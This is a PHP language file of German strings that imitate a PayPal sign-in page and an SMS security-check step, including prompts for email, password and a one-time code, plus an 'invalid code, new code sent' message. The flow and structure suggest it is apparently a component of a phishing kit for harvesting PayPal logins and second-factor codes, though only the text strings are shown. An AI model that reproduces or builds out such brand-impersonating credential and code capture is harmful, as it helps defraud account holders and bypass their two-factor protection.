<?php

function lang($phrase){
    static $lang = array(
        '1' => 'In Ihrem PayPal-Konto anmelden',
        '2' => 'E-Mail oder Handynummer',
        '3' => 'Passwort',
        '4' => 'Passwort vergessen?',
        '5' => 'Anmelden',
        '6' => 'oder',
        '7' => 'Registrieren',
        '8' => 'Englisch',
        '9' => 'Französisch',
        '10' => 'Spanisch',
        '11' => '文',
        '12' => 'Schnelle Sicherheitsüberprüfung',
        '13' => 'Wir benötigen nur einige zusätzliche Informationen, um zu bestätigen, dass Sie es sind.',
        '14' => 'Eine SMS erhalten',
        '15' => 'Wenn Sie fortfahren, bestätigen Sie, dass Sie berechtigt sind, diese Telefonnummer zu verwenden, und stimmen zu, Textnachrichten zum Bestätigen Ihrer Identität in dieser Sitzung zu erhalten. Möglicherweise fallen Gebühren Ihres Mobilfunkanbieters an. Wir können Abonnenten- und Gerätedetails von Ihrem Mobilfunkanbieter erhalten, um sie für Risiko- und Betrugszwecke zu verwenden.',
        '16' => 'Weiter',
        '17' => 'Geben Sie Ihren Code ein.',
        '18' => 'Erneut senden',
        '19' => 'Fortfahren',
        '20' => 'Kontaktiere uns',
        '21' => 'Datenschutz',
        '22' => 'Rechtliches',
        '23' => 'Richtlinienaktualisierungen',
        '24' => 'Weltweit',
        '25' => 'Ungültiger Code. Wir haben Ihnen einen neuen Code gesendet.',
    );

    return $lang[$phrase];
}
?>
